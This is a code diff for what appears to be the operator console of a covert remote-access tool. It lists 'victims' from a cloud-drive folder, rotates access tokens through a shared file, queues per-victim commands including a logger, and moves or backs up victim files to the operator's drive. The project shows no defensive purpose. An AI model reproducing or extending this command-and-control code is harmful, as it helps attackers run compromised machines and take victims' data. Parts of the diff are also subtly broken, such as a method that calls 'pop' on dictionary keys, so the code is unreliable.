@@ -7,7 +7,7 @@ import atexit
 from server.util import data_store
 from server.util import force_stop
 
-from server.drive import (drive_file, source_drive, vic_path, move_file, init_vic)
+from server.drive import (backup, drive_file, source_drive, move_file, drive)
 import server.drive as _d
 import atexit
 import string
@@ -27,6 +27,13 @@ from rpyc import connect
 # from iamlaizy import reload_me
 # reload_me()
 
+
+bf_name=data_store.var.backup_folder_name
+vic_path=data_store.var.vic_path
+token_file=data_store.var.token_file
+command_file=data_store.var.command_file
+bucket_port=data_store.var.bucket_port
+last_time=data_store.var.last_time
 
 #%%
 def init_console():
@@ -137,9 +144,8 @@ def clear():
     window.refresh()
 
 
-init_vic()
-if _d.secure_mod and not _d.vic:
-    log.error('No previous cached user list found.')
+
+victims=[]
 
 
 class Home:
@@ -189,6 +195,7 @@ class Home:
 
     def show(self):# main function
         window.keypad(1)
+        self.refresh()
         self.resize()
 
         while 1:
@@ -198,7 +205,7 @@ class Home:
     def print_name_box(self):
         column=1
         pos=1
-        for name in _d.vic[self.start:self.stop+1]:
+        for name in victims[self.start:self.stop+1]:
             
             if pos>=self.boxh:
                 if column==self.columns:
@@ -216,7 +223,7 @@ class Home:
             pos+=self.step
         
         self.endpoint = [column, pos-self.step]
-        if _d.vic:
+        if victims:
             self.color()
 
     def scroll_bar(self):
@@ -255,14 +262,14 @@ class Home:
     
         self.rows=ceil((self.boxh-1)/self.step) # excluding border line and one one name in two row
         
-        if not _d.vic:
+        if not victims:
             return
-        # on change of _d.vic list
-        self.maxln=len(max(_d.vic, key=lambda x:len(x)))+3# 2 spaces and 1 circle
+        # on change of victims list
+        self.maxln=len(max(victims, key=lambda x:len(x)))+3# 2 spaces and 1 circle
         self.columns = (boxw-1)//self.maxln # excluding border line
         self.pad=(boxw-(self.columns*self.maxln))//self.columns # plus or *
         self.single_page=self.rows*self.columns
-        self.total_page=ceil(len(_d.vic)/self.single_page) # 0 indexed for scroll bar
+        self.total_page=ceil(len(victims)/self.single_page) # 0 indexed for scroll bar
         
     def resize(self):
         log.info('resturcting the whole home page')
@@ -344,8 +351,8 @@ class Home:
     def selected_name(self):
         '''1 indexed c: column and r: row'''
         pos=self.start+(self.rows*(self.selected[0]-1))+(self.selected[1]-1)//2
-        # pos=len(_d.vic)-1 if pos>=len(_d.vic) else pos
-        name=_d.vic[pos]
+        # pos=len(victims)-1 if pos>=len(victims) else pos
+        name=victims[pos]
         return name
 
     def _color(self):
@@ -388,29 +395,35 @@ class Home:
         ]
         if full:
             _s="press 's' to turn (on-off) token_provider"
-            if token_provider.running:
-                _s+=" and 'r' to refresh vic list"
-            
+            _s+=" and 'r' to refresh vic list"
             status.append(_s)
 
-        
         middle_print_lst(status_bar, status, 1)
         status_bar.refresh()
 
     def refresh(self):
+        victims.clear()
         if _d.secure_mod:
+            name_lst=drive.list_folder(join(vic_path, bf_name))
+            victims.extend(name_lst)
+
+            if not name_lst:
+                log.error('No previous cached user list found.')
+            else:
+                log.warning("showing cached victims name")
             return
 
-        lst = source_drive.list_folder(vic_path)
+        victims.extend(drive.list_folder(vic_path))# list host drive first
+        lst = source_drive.list_folder(vic_path)# list source drive
         log.info(f'got {len(lst)} new victims.')
         if not lst:
             return
 
-        _d.vic.extend(lst)
+        victims.extend(lst)
         self.resize()
         log.info("home page restructured.")
         
-        # func move_folders
+        # func move all file on a folders from source to host
         for i in source_drive.list_folder(vic_path):
             move_file(join(vic_path, i))
     
@@ -441,8 +454,6 @@ def listener():
         sleep(10)
     
 class Tokener:
-    expiry = data_store.var.safety_interval
-
     def __init__(self):
         self.core = Thread(target=self.update_token, daemon=True, name='tokener')
         self.listen = Thread(target=listener, daemon=True, name="file listener")
@@ -464,10 +475,13 @@ class Tokener:
             return
 
         log.info('stoping token rovider')
-        with drive_file(data_store.var.token_file) as f:
+        with drive_file(token_file) as f:
             f.rewrite("")
         force_stop(self.core)
         force_stop(self.listen)
+        
+        for file in drive.list_folder(vic_path):# backup all file
+            backup(file)
         
         _d.secure_mod=True
         self.__init__()
@@ -495,18 +509,19 @@ class Tokener:
     def update_token(self):
         log.debug('trying to connect with the bucket')
         try:
-            conn=connect('localhost', data_store.var.bucket_port)
+            conn=connect('localhost', bucket_port)
         except ConnectionRefusedError:
             log.error('token provider can\'t start because bucket is not running.')
+            self.__init__()
             return
         self.tokens=conn.root
         
         while 1:
-            with drive_file(data_store.var.token_file) as f:
+            with drive_file(token_file) as f:
                 log.info('token provider seeking for token.')
                 token=self.get_token()
                 f.rewrite(token)
-                
+            
             log.info('updated previous token.')
             sleep(token['expiry']-net_time()-20)# wait for the bucket to be full again
 
@@ -613,7 +628,6 @@ class Multi_opt(Option_view):
         
         while 1:
             key=self.opt_win.getch()
-            key=self.opt_win.getch()
             if key==curses.ascii.ESC:
                 self.exit()
                 return
@@ -670,8 +684,11 @@ class action:
         log.info(f'showing action page for {vic_name}')
 
         self.vic_name = vic_name
-        self.last_time=0# fix it later on
-        self.commands={}# also this one # previous command that is not responsed
+        self.last_time = last_time.get(vic_name, 0)
+        self.commands={
+            self.vic_name:[]
+        }# also this one # previous command that is not responsed
+        
 
         clear()
         sh, sw = window.getmaxyx()
@@ -703,6 +720,7 @@ class action:
         opt_viewer.on_selection=self.print_des
         opt_viewer.exit=self.commit
         opt_viewer.show()
+        log.info('action page closed')
 
     def print_des(self, opt):
         self.des_win.clear()
@@ -762,7 +780,11 @@ class action:
             "func":"set_value",
             "kwargs":kv
         }
-        sec = self.stage(command)
+        
+        if key=="last_user_time":
+            self.last_time=p
+
+        self.stage(command)
         clear()
 
     def start_logger(self):
@@ -798,27 +820,38 @@ class action:
         path=join(path, name)
         listen_for.append(path)
 
+    def included(self, command):
+        for i in self.commands:
+            ltime=i.pop('time')
+            if i==command:
+                i['time']=ltime
+                return True
+            i['time']=ltime
+        return False
+
     def stage(self, command):
-        log.info(f"starting {command['func']} function")
+        log.info(f"staged {command['func']} function")
         log.debug(f"staged full command: {command}")
+        if self.included(command):
+            return
 
         self.last_time+=1
-        command["time"]=self.last_time,
-        if self.commands.get(self.vic_name):
-            self.commands[self.vic_name].append(command)
-        else:
-            self.commands[self.vic_name]=[command]
+        command["time"]=self.last_time
+        self.commands[self.vic_name].append(command)
         return self.last_time
     
     def commit(self):
         log.info("puhing all the staged commands.")
         if not self.commands:
             return
-        with drive_file(data_store.var.command_file) as f:
-            pre_com:dict=json.loads(f.read())
+
+        with drive_file(command_file) as f:
+            pre_com:dict=json.loads(f.read()or"{}")
             self.commands.update(pre_com)
             f.rewrite(self.commands)
 
+        last_time[self.vic_name]=self.last_time
+        data_store.set_value('last_time', last_time)
 
 
 
@@ -839,3 +872,4 @@ if __name__=="__main__":
     # window.refresh()
     # sleep(3)
     # window.getch()
+
